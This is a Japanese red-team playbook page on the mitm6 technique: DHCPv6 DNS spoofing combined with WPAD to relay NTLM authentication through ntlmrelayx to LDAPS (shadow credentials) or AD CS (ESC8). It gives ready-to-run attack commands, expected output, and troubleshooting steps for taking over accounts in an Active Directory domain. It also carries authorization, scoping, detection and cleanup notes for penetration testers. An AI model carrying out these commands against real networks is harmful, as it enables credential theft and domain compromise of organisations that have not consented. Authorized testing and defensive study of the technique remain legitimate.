# mitm6 — IPv6 DNS スプーフィング（DHCPv6 / WPAD 悪用）

> **スコープ**: IPv6 の DHCPv6 を悪用して偽 DNS サーバーを設定させ、WPAD 経由で NTLM 認証を ntlmrelayx へリレーする。LLMNR / NBT-NS が GPO で無効化されている環境での代替経路。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 業務停止リスク（セグメント全体の DHCPv6 に干渉し、意図しないホストの IPv6 DNS 設定が攻撃者端末を向く）
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む（DHCPv6 リース期間中は影響が持続するが、停止後は自然に解消される）
> - [x] SIEM/EDR で確実に検知される（ネットワーク NDR による不正 DHCPv6 サーバー検出 / MDI「Suspected network tampering」）
>
> 実施可否は事前合意で明示確認すること。**対象セグメントと実施時間帯を書面で限定すること。業務時間内の実施は原則禁止。** 演習環境では制約なし。

## 着火条件

以下のすべてが揃ったときに試みる：

- LLMNR / NBT-NS が GPO で無効化されており、Responder でハッシュが来ない
- Coerce 系（PetitPotam / PrinterBug / DFSCoerce）も塞がれているまたは使えない状況
- 対象セグメントで IPv6 が無効化されていない（または未確認）
- ntlmrelayx を構えられる LDAPS / SMB / AD CS リレー先が存在する

## 環境前提
- 実行環境: テスター端末（ターゲットと同一 L2 セグメント。DHCPv6 はリンクローカルマルチキャストのためルーター越え不可）
- 必要なツール: `mitm6`（`pip install mitm6 --break-system-packages`。ペネトレ用 Linux ディストリに含まれる場合もあるが最新版確認推奨。GitHub: `dirkjanm/mitm6`）/ `ntlmrelayx`（Impacket 付属・標準搭載）
- 必要な権限: テスター端末上での `root` 権限（DHCPv6 パケット送信・raw socket 操作のため必須）
- 外部リソース依存: mitm6 はインターネットアクセス要。オフライン環境では whl ファイルを事前転送

## 先に確認すること

**IPv6 の有効性と WPAD 設定の確認:**

```bash
# [Attacker] 対象セグメントで DHCPv6 Solicit が飛んでいるかを観察（受動確認）
sudo tcpdump -i [INTERFACE] 'udp port 547' -n
# → DHCPv6 Solicit（宛先 ff02::1:2）が見えれば IPv6 が有効

# [Attacker] WPAD 自動検出が有効かどうかの間接確認
nslookup wpad.[DOMAIN] [DC_IP]
# → "Non-existent domain" が返れば WPAD DNS エントリなし（mitm6 で偽応答できる余地がある）
```

**攻撃者の思考トレース:** LLMNR / NBT-NS が GPO で無効化された環境でも、IPv6 の DHCPv6 は GPO による制御が及ばないことが多い。Windows は IPv6 を IPv4 より優先する仕様のため、偽の DHCPv6 サーバーが DNS を提供すると、WPAD 等の名前解決が攻撃者端末を向く。GPO による LLMNR 無効化を回避できる数少ない手法の一つ。

---

## 1. ntlmrelayx を先に起動（必須）

ntlmrelayx がリスナーを先に立てることで、mitm6 が誘導した認証コールバックを確実に受け取れる。

**事前準備（必須）:**

```bash
# [Attacker] ターミナル 1: ntlmrelayx を WPAD + LDAPS リレー設定で起動
sudo ntlmrelayx.py \
  -t ldaps://[DC_IP] \
  --wpad \
  --shadow-credentials \
  --shadow-target [TARGET_MACHINE$]

# AD CS ESC8 をターゲットにする場合
sudo ntlmrelayx.py \
  -t http://[CA_SERVER]/certsrv/certfnsh.asp \
  --wpad \
  --adcs \
  --template [CERT_TEMPLATE]
```

ntlmrelayx の各オプション詳細 → `ntlmrelayx.md`

---

## 2. mitm6 を起動

**事前準備（必須）:** `[INTERFACE]` はターゲットセグメントに接続しているインターフェースを `ip a` で確認して指定する。`-d [DOMAIN]` は対象の AD ドメイン名を必ず指定する（**指定しないとドメイン外の DNS クエリにも偽応答してしまい影響範囲が意図せず拡大する**）。

**コマンド:**

```bash
# [Attacker] ターミナル 2: mitm6 を対象ドメインに限定して起動
sudo mitm6 -i [INTERFACE] -d [DOMAIN]
```

主要オプション:

| オプション | 効果 |
|-----------|------|
| `-i [INTERFACE]` | DHCPv6 を送信するインターフェース |
| `-d [DOMAIN]` | 対象ドメインのみに DNS 偽応答（必須：影響範囲を限定する）|
| `--no-ra` | Router Advertisement を送信しない |
| `-v` | 詳細ログ |

---

## 3. 認証フローの待機と確認

**観測される出力 → 次のアクション:**

```
# mitm6 出力例（DHCPv6 偽応答成功時）
[*] Sent REPLY for [CLIENT_IPv4] with [ATTACKER_IPv6] as DNS

# ntlmrelayx 出力例（WPAD 経由で NTLM 認証受信時）
[*] Incoming connection ([CLIENT_IP], [NTLM_TARGET]) NTLMSSP_NEGOTIATE
[*] SMBD-Thread-X: Relaying to ldaps://[DC_IP]
[*] Shadow credentials attack required LDAPS
```

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| mitm6 が `Sent REPLY for [CLIENT_IPv6]` を出力 | DHCPv6 偽応答が刺さっている | ntlmrelayx 側に認証が来るまで待つ |
| ntlmrelayx に `Incoming connection` が表示される | WPAD 経由で NTLM 認証が来た | リレー先での操作が進む |
| ntlmrelayx が PFX ファイルパスとパスワードを出力 | Shadow Credentials 取得成功 | PKINIT → TGT 取得フローへ → `ntlmrelayx.md`（§4）|
| mitm6 が何も出力しない（Sent REPLY がない）| IPv6 が GPO・NIC 設定で無効化されている | mitm6 は機能しない → `Coerce.md` へ |
| mitm6 は動いているが ntlmrelayx に何も来ない | WPAD が GPO で無効化 / 実際の WPAD DNS が先に応答 | `-d` の指定ドメインが正しいか確認 |

---

## 刺さらなかったとき（全体）

| 状況 | 対処 |
|------|------|
| mitm6 が何も出力しない | IPv6 が全ホストで無効化されている → `Coerce.md` に切り替える |
| DNS 問い合わせは来るが ntlmrelayx に NTLM が届かない | WPAD 自動検出が GPO で無効化されているか、実際の WPAD DNS エントリが先に応答している |
| ntlmrelayx でリレーは成功するが権限が低い | 一般ユーザーの認証のみ。管理者アカウントのログインまたは DC$ の認証が来るまで継続する |
| LDAPS Channel Binding エラー | LDAP Channel Binding が有効。`-t smb://[TARGET_IP]` または ESC8（AD CS）に切り替える |

---

## 注意点・落とし穴

- **mitm6 は影響範囲が非常に広い**: セグメント全体の DHCPv6 に干渉するため、スコープ外のホストにも影響が及ぶ可能性がある。本番では対象セグメントと時間帯を書面で限定し、業務時間内は原則使用しない
- **停止後も DHCPv6 リースが残る**: mitm6 を停止しても、クライアントが取得した IPv6 リースの期間中は攻撃者端末を DNS サーバーとして参照し続ける。停止後は対象ホストの再起動またはリース期間の経過を待つ
- **`-d` で対象ドメインを必ず限定する**: 指定しないとセグメント全体の DNS クエリに応答してしまい、業務影響が大幅に拡大する
- **ntlmrelayx と mitm6 は別ターミナルで起動する。ntlmrelayx を先に起動する順序を守る**
- **LLMNR / NBT-NS との併用は不要**: Responder は起動しなくてよい（NTLM 認証は WPAD 経由で ntlmrelayx が受け取る）

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。セグメント全体の DHCPv6 に干渉するため、スコープ外ホストへの波及リスクがある。実施可否・対象セグメント・実施時間帯を書面で明示確認する
- **想定されるSIEM/EDR検知**: ネットワーク NDR（不正 DHCPv6）/ MDI「Suspected network tampering」/ クライアントのネットワーク設定変更ログ / Sysmon Event 22
- **業務影響リスク**: DHCPv6 リース期間中は対象ホストのデフォルト DNS が攻撃者端末を向く。業務用 WPAD が機能しなくなる / HTTP トラフィックが攻撃者を経由する可能性がある。**業務時間外に実施・時間帯を限定することが必須**
- **原状回復必須項目**: ✅ mitm6 停止後、影響を受けたホストの IPv6 リース解放を確認（再起動またはリース期間経過待ち）/ ✅ ntlmrelayx 側で取得した Shadow Credentials / RBCD / マシンアカウントの削除（`ntlmrelayx.md` 参照）/ ✅ 取得した認証情報・証明書・ハッシュの暗号化保管 → テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：LLMNR / NBT-NS ポイズニングが GPO で無効化されている状況の確認 → `Responder.md`
- 前：Coerce 系が全滅した場合の代替経路として使用 → `Coerce.md`
- 後：受け取った NTLM 認証のリレー → `ntlmrelayx.md`
- 後：LDAPS Shadow Credentials 取得 → `ntlmrelayx.md`（§4）
- 後：ESC8 AD CS リレー → `ntlmrelayx.md`（§5）
